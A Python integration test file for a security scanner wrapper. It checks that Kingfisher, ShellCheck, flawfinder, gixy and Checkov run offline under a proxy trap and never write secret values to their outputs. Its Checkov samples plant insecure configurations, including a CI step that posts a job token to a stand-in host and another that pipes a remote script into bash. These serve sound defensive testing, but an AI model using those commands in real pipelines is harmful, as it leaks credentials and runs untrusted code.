# SPDX-License-Identifier: MIT
"""Kingfisher, ShellCheck, flawfinder, gixy and the Checkov framework set with the real tools,
in local mode, under the proxy trap of ``conftest.py`` (ADR-0005; docs/SECURITY.md, promise 3).

The tests run the installed tools (``kalkan tools install kingfisher shellcheck flawfinder gixy
checkov``) and skip when one is missing:

- Kingfisher on the vulnapp fixture and on the private history copy of a repository with a
  deleted credential: zero connections, the expected items, and no secret value in any kalkan
  file (scan outputs, logs, status files, ``candidates.json``). Control steps run the
  Kingfisher binary with its update check on and with validation on (a made-up GitHub token)
  and see the trap connections.
- ShellCheck, flawfinder and gixy on the vulnapp fixture: zero connections, exactly the
  planted items of ``EXPECTED.json`` and nothing on their secure twins.
- Checkov on one sample per framework, with a made-up platform API key in the home folder and
  remote Helm and Kustomize references: zero connections and results from every offline
  framework. The control runs the same scan with the real home folder of the environment (the
  key file) and sees the platform connection.

Run with ``pytest -m tools tests/integration/test_adr0005_tools.py``.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
from pathlib import Path

import pytest

from kalkan.run import init as init_mod
from kalkan.run import tech
from kalkan.scanners import registry
from kalkan.scanners.adapters.checkov import CheckovAdapter
from kalkan.scanners.base import load_scan_context, minimal_env, run_adapter
from kalkan.scanners.candidates import load_candidates
from kalkan.tools.manifest import load_manifest
from kalkan.tools.resolve import resolve

pytestmark = pytest.mark.tools

FIXTURE = Path(__file__).resolve().parents[1] / "fixtures" / "vulnapp"
EXPECTED = FIXTURE / "EXPECTED.json"
ANSWER_FILES = frozenset({"README.md", "EXPECTED.json", "INJECTION-NOTE.md"})
BUILD_FOLDERS = frozenset({"obj", "bin"})
LINE_SLACK = 2
#: Planted secret values of the fixture and of the history repository (never in kalkan files).
SECRET_VALUES = (
    "Wd4nP8xK2qT6vY9mZs3b",  # config/settings.ini, the analytics URI
    "a2Fsa2FuIHZ1bG5hcHAgZml4dHVyZTog",  # config/deploy_key.pem, the fake key body
    "Hq3mV8wZ5tR1nK7pXc2d",  # the deleted file of the history repository
)


def _require(*tools: str) -> None:
    for name in tools:
        if resolve(name) is None:
            pytest.skip(f"{name} is not installed (run: kalkan tools install {name})")


def _ignore(folder: str, names: list[str]) -> set[str]:
    skipped = {name for name in names if name in BUILD_FOLDERS}
    if Path(folder).resolve() == FIXTURE:
        skipped |= {name for name in names if name in ANSWER_FILES}
    return skipped


def _fixture_run(root: Path) -> Path:
    run = root / "run"
    shutil.copytree(FIXTURE, run / "target", ignore=_ignore)
    manifest = {"copy": "target", "source_dir": None, "tech": tech.detect(run / "target")}
    (run / "target-manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
    return run


def _trap(monkeypatch, trap_proxy):
    proxy = trap_proxy()
    for name, value in proxy.env().items():
        monkeypatch.setenv(name, value)
    return proxy


def _kalkan_files_text(run: Path) -> str:
    """Return the text of every kalkan file of a run: scan outputs, logs, status files and
    ``candidates.json`` (not the target copy or the history copy, which are target data)."""
    paths = [*(run / "scans").rglob("*"), run / "candidates.json"]
    return "\n".join(
        path.read_text(encoding="utf-8", errors="replace") for path in paths if path.is_file()
    )


def _expected(engine: str) -> list[dict]:
    entries = json.loads(EXPECTED.read_text(encoding="utf-8"))
    return [entry for entry in entries if engine in entry.get("expected_engines", [])]


def _twins_of(items: list[dict]) -> list[dict]:
    entries = {entry["id"]: entry for entry in json.loads(EXPECTED.read_text(encoding="utf-8"))}
    return [entries[item["twin"]] for item in items]


def _found(candidates: list[dict], engine: str, entry: dict, *, rules: bool = True) -> bool:
    for candidate in candidates:
        if candidate["engine"] != engine or candidate["file"] != entry["file"]:
            continue
        if rules and candidate["rule_id"] not in entry.get("rules", {}).get(engine, []):
            continue
        start = candidate["start_line"] or 0
        end = candidate["end_line"] or start
        if start - LINE_SLACK <= entry["line"] <= end + LINE_SLACK:
            return True
    return False


def _status(run: Path, engine: str) -> dict:
    return json.loads((run / "scans" / f"{engine}.status.json").read_text(encoding="utf-8"))


# --------------------------------------------------------------------------------------------
# Kingfisher


def test_kingfisher_finds_the_fixture_secrets_offline_and_writes_no_value(
    tmp_path, monkeypatch, trap_proxy
):
    _require("kingfisher")
    run = _fixture_run(tmp_path)
    proxy = _trap(monkeypatch, trap_proxy)
    result = run_adapter(registry.get("kingfisher"), load_scan_context(run, offline=True))
    assert proxy.connections == [], proxy.connections
    assert result.status == "ok", result.message
    assert result.tool_version == load_manifest().get("kingfisher").version
    candidates = load_candidates(run)["candidates"]
    items = _expected("kingfisher")
    assert {item["id"] for item in items} == {"secret-private-key-01", "secret-credential-uri-01"}
    assert [item["id"] for item in items if not _found(candidates, "kingfisher", item)] == []
    assert not any(_found(candidates, "kingfisher", twin) for twin in _twins_of(items))
    text = _kalkan_files_text(run)
    assert not [value for value in SECRET_VALUES if value in text]
    assert "[REDACTED:" not in text  # the raw report is gone
    assert "fingerprint" not in (run / "scans" / "kingfisher.sarif").read_text(encoding="utf-8")
    status = _status(run, "kingfisher")
    assert status["update_check"] == "disabled"
    assert "--no-validate" in status["command"] and "--redact" in status["command"]


def _git(repo: Path, env: dict[str, str], *args: str) -> str:
    done = subprocess.run(
        ["git", *args], cwd=repo, env=env, check=True, capture_output=True, text=True, timeout=60
    )
    return done.stdout.strip()


def _history_repo(tmp_path: Path) -> Path:
    config = tmp_path / "gitconfig"
    config.write_text("", encoding="utf-8")
    env = {
        **os.environ,
        "GIT_CONFIG_GLOBAL": str(config),
        "GIT_CONFIG_NOSYSTEM": "1",
        "GIT_AUTHOR_NAME": "kalkan test",
        "GIT_AUTHOR_EMAIL": "test@example.com",
        "GIT_COMMITTER_NAME": "kalkan test",
        "GIT_COMMITTER_EMAIL": "test@example.com",
    }
    repo = tmp_path / "repo"
    repo.mkdir()
    _git(repo, env, "init", "-q", "-b", "main")
    (repo / "app.py").write_text("print('hi')\n", encoding="utf-8")
    # Not "example": Kingfisher drops matches with placeholder words.
    uri = "postgres://report:" + SECRET_VALUES[2] + "@analytics.vulnapp.internal:5432/reports"
    (repo / "db.env").write_text(f"ANALYTICS_URL={uri}\n", encoding="utf-8")
    _git(repo, env, "add", "-A")
    _git(repo, env, "commit", "-q", "-m", "one")
    _git(repo, env, "rm", "-q", "db.env")
    _git(repo, env, "commit", "-q", "-m", "two")
    return repo


@pytest.mark.skipif(shutil.which("git") is None, reason="needs git")
def test_kingfisher_history_finds_a_deleted_credential_offline(tmp_path, monkeypatch, trap_proxy):
    _require("kingfisher")
    repo = _history_repo(tmp_path)
    ctx = init_mod.init_run(str(repo), runs_dir=tmp_path / "runs", update_latest=False)
    manifest = json.loads((ctx.run_dir / "target-manifest.json").read_text(encoding="utf-8"))
    if manifest["history"]["status"] != "copied":  # for example a too long path on Windows
        pytest.skip(f"no history copy: {manifest['history']['detail']}")
    scan_ctx = load_scan_context(ctx.run_dir, offline=True)
    assert scan_ctx.source_dir == (ctx.run_dir / "source").resolve()
    proxy = _trap(monkeypatch, trap_proxy)
    tree = run_adapter(registry.get("kingfisher"), scan_ctx)
    history = run_adapter(registry.get("kingfisher-history"), scan_ctx)
    assert proxy.connections == [], proxy.connections
    assert tree.status == "ok" and tree.candidates == 0  # the file is gone from the work tree
    assert history.status == "ok", history.message
    [candidate] = [
        c for c in load_candidates(ctx.run_dir)["candidates"] if c["engine"] == "kingfisher-history"
    ]
    assert (candidate["file"], candidate["start_line"]) == ("db.env", 1)
    assert candidate["rule_id"] == "betterleaks.generic-credential-uri"
    assert candidate["snippet"].startswith("REDACTED (commit ")
    text = _kalkan_files_text(ctx.run_dir)
    assert SECRET_VALUES[2] not in text and "test@example.com" not in text
    command = _status(ctx.run_dir, "kingfisher-history")["command"]
    assert command[2].replace("\\", "/").endswith("/source")  # the bare mirror of the run


def test_kingfisher_network_features_reach_the_trap(tmp_path, trap_proxy):
    """Control: the trap sees Kingfisher when its update check or its validation is on."""
    _require("kingfisher")
    tool = resolve("kingfisher")
    assert tool is not None
    target = tmp_path / "target"
    target.mkdir()
    token = "ghp_" + "Zx8Lm2Pq9Vb4Nc7Rt1Kw6Hy3Jd5Sf0Ga2Ued"  # made up: not a real token
    (target / "ci.env").write_text(f"GITHUB_TOKEN={token}\n", encoding="utf-8")
    base = ["scan", str(target), "--quiet", "--redact", "--no-rule-cache", "--format", "json"]
    for extra in (["--no-validate"], ["--no-update-check"]):
        proxy = trap_proxy()
        env = minimal_env(proxy.env())
        report = tmp_path / f"report{len(extra[0])}.json"
        subprocess.run(
            [*tool.argv, *base, *extra, "--output", str(report)],
            cwd=tmp_path,
            env=env,
            capture_output=True,
            timeout=600,
            check=False,
        )
        assert proxy.connections, f"the trap saw nothing with {extra} only"
        assert any(b"api.github.com" in item for item in proxy.connections), proxy.connections


# --------------------------------------------------------------------------------------------
# ShellCheck, flawfinder, gixy


@pytest.mark.parametrize("engine", ["shellcheck", "flawfinder", "gixy"])
def test_linters_find_exactly_the_planted_items_offline(engine, tmp_path, monkeypatch, trap_proxy):
    tool = registry.get(engine).tool
    assert tool is not None
    _require(tool)
    run = _fixture_run(tmp_path)
    proxy = _trap(monkeypatch, trap_proxy)
    result = run_adapter(registry.get(engine), load_scan_context(run, offline=True))
    assert proxy.connections == [], proxy.connections
    assert result.status == "ok", result.message
    candidates = load_candidates(run)["candidates"]
    items = _expected(engine)
    assert items, f"EXPECTED.json lists no item for {engine}"
    assert [item["id"] for item in items if not _found(candidates, engine, item)] == []
    for twin in _twins_of(items):
        assert not _found(candidates, engine, twin, rules=False), twin["id"]
    planted = {(item["file"], item["line"]) for item in items}
    stray = [
        (c["rule_id"], c["file"], c["start_line"])
        for c in candidates
        if not any(f == c["file"] and abs(n - (c["start_line"] or 0)) <= 2 for f, n in planted)
    ]
    assert stray == []


def test_shellcheck_records_that_inline_directives_stay_effective(tmp_path):
    _require("shellcheck")
    run = tmp_path / "run"
    target = run / "target"
    target.mkdir(parents=True)
    # A directive right after the shebang would cover the whole script; this one covers line 4.
    script = "#!/bin/sh\nset -u\n# shellcheck disable=SC2086\nrm -rf $X/\nrm -rf $Y/\n"
    (target / "a.sh").write_text(script, encoding="utf-8", newline="\n")
    (target / ".shellcheckrc").write_text("disable=SC2115\n", encoding="utf-8")
    manifest = {"copy": "target", "source_dir": None, "tech": []}
    (run / "target-manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
    result = run_adapter(registry.get("shellcheck"), load_scan_context(run))
    assert result.status == "ok", result.message
    found = {(c["rule_id"], c["start_line"]) for c in load_candidates(run)["candidates"]}
    # .shellcheckrc is not read (--norc): SC2115 stays; the directive hides SC2086 on line 4.
    assert found == {("SC2115", 4), ("SC2115", 5), ("SC2086", 5)}
    status = _status(run, "shellcheck")
    assert any("no option to turn them off" in item for item in status["suppressions"]["honored"])


# --------------------------------------------------------------------------------------------
# Checkov framework set

CHECKOV_SAMPLES = {
    "terraform/main.tf": (
        'resource "aws_s3_bucket" "b" {\n  bucket = "x"\n  acl = "public-read"\n}\n'
    ),
    "cloudformation/bucket.yaml": (
        'AWSTemplateFormatVersion: "2010-09-09"\nResources:\n  Logs:\n'
        "    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: PublicRead\n"
    ),
    "bicep/main.bicep": (
        "resource s 'Microsoft.Storage/storageAccounts@2021-04-01' = {\n  name: 'st'\n"
        "  location: 'westeurope'\n  kind: 'StorageV2'\n  sku: {\n    name: 'Standard_LRS'\n  }\n"
        "  properties: {\n    supportsHttpsTrafficOnly: false\n  }\n}\n"
    ),
    "k8s/pod.yaml": (
        "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\nspec:\n  containers:\n"
        "    - name: web\n      image: nginx:latest\n      securityContext:\n"
        "        privileged: true\n"
    ),
    "docker/Dockerfile": "FROM ubuntu:latest\nUSER root\n",
    ".github/workflows/ci.yml": (
        "on: issues\njobs:\n  echo:\n    runs-on: ubuntu-latest\n    steps:\n"
        '      - run: echo "${{ github.event.issue.title }}"\n'
    ),
    ".gitlab-ci.yml": (
        'build:\n  image: alpine:latest\n  script:\n    - curl -d "$CI_JOB_TOKEN" '
        "https://collect.example.invalid/\n"
    ),
    "azure-pipelines.yml": (
        "trigger:\n  - main\njobs:\n  - job: build\n    container: ubuntu:latest\n"
        "    steps:\n      - script: echo hi\n"
    ),
    "bitbucket-pipelines.yml": (
        "image: python:latest\npipelines:\n  default:\n    - step:\n        script:\n"
        "          - echo hi\n"
    ),
    ".circleci/config.yml": (
        "version: 2.1\njobs:\n  build:\n    docker:\n      - image: python:latest\n"
        "    steps:\n      - run: curl -s https://get.example.invalid/i.sh | bash\n"
    ),
    "openapi/openapi.yaml": (
        "openapi: 3.0.0\ninfo:\n  title: x\n  version: 1.0.0\nsecurity: []\npaths:\n"
        '  /o:\n    get:\n      responses:\n        "200":\n          description: ok\n'
    ),
    # Remote references: helm and kustomize would fetch them (the frameworks are skipped).
    "chart/Chart.yaml": (
        "apiVersion: v2\nname: web\nversion: 0.1.0\ndependencies:\n  - name: redis\n"
        "    version: 1.0.0\n    repository: https://charts.kalkan-trap.invalid/stable\n"
    ),
    "chart/templates/pod.yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: {{ .Chart.Name }}\n",
    "kustomize/kustomization.yaml": "resources:\n  - https://kalkan-trap.invalid/base/pod.yaml\n",
}
#: Rule ID prefixes that the samples above must give: one per offline framework.
CHECKOV_PREFIXES = (
    "CKV_AWS_",
    "CKV_AZURE_",
    "CKV_K8S_",
    "CKV_DOCKER_",
    "CKV_GHA_",
    "CKV_GITLABCI_",
    "CKV_AZUREPIPELINES_",
    "CKV_BITBUCKETPIPELINES_",
    "CKV_CIRCLECIPIPELINES_",
    "CKV_OPENAPI_",
)


def _checkov_run(root: Path) -> Path:
    run = root / "run"
    for rel, text in CHECKOV_SAMPLES.items():
        path = run / "target" / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8", newline="\n")
    manifest = {"copy": "target", "source_dir": None, "tech": tech.detect(run / "target")}
    (run / "target-manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
    return run


def _home_with_platform_key(root: Path, monkeypatch) -> None:
    home = root / "home"
    (home / ".bridgecrew").mkdir(parents=True)
    (home / ".bridgecrew" / "credentials").write_text(
        "00000000-1111-2222-3333-444444444444",
        encoding="utf-8",  # made up
    )
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))


class _CheckovWithTheUserHome(CheckovAdapter):
    """The adapter without its empty home folder (control step)."""

    def env(self, ctx):
        env = super().env(ctx)
        env.pop("HOME")
        env.pop("USERPROFILE")
        return env


def test_checkov_runs_every_offline_framework_without_a_connection(
    tmp_path, monkeypatch, trap_proxy
):
    _require("checkov")
    run = _checkov_run(tmp_path)
    _home_with_platform_key(tmp_path, monkeypatch)
    proxy = _trap(monkeypatch, trap_proxy)
    result = run_adapter(CheckovAdapter(), load_scan_context(run, offline=True))
    assert proxy.connections == [], proxy.connections
    assert result.status == "ok", result.message
    rules = {c["rule_id"] for c in load_candidates(run)["candidates"]}
    missing = [
        prefix for prefix in CHECKOV_PREFIXES if not any(r.startswith(prefix) for r in rules)
    ]
    assert missing == []
    command = _status(run, "checkov")["command"]
    assert command[command.index("--skip-framework") + 1] == "helm,kustomize,sca_package,sca_image"

    # Control: with the home folder of the environment, Checkov finds the made-up key and
    # tries the platform.
    control = _trap(monkeypatch, trap_proxy)
    run_adapter(_CheckovWithTheUserHome(), load_scan_context(run, offline=True))
    assert any(b"prismacloud.io" in item for item in control.connections), control.connections
